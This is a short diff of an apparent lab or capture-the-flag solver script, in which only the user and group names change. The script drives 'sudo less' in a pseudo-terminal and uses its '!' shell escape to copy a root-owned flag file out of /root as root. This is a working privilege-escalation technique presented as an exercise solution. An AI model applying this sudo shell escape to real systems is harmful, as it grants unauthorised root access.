@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-OUT_FILE="/home/student/.b2_captured_flag"
+OUT_FILE="/home/member/.b2_captured_flag"
 rm -f "$OUT_FILE"
 
 # Drive `sudo /usr/bin/less /var/log/quest-demo.log` inside a PTY to trigger `!` shell escape
@@ -40,7 +40,7 @@ def drain(duration: float) -> None:
 drain(0.4)
 os.write(
     master,
-    b"!cp /root/b2_flag.txt /home/student/.b2_captured_flag && chown student:student /home/student/.b2_captured_flag\r",
+    b"!cp /root/b2_flag.txt /home/member/.b2_captured_flag && chown member:bug /home/member/.b2_captured_flag\r",
 )
 drain(0.6)
 os.write(master, b"\rq")
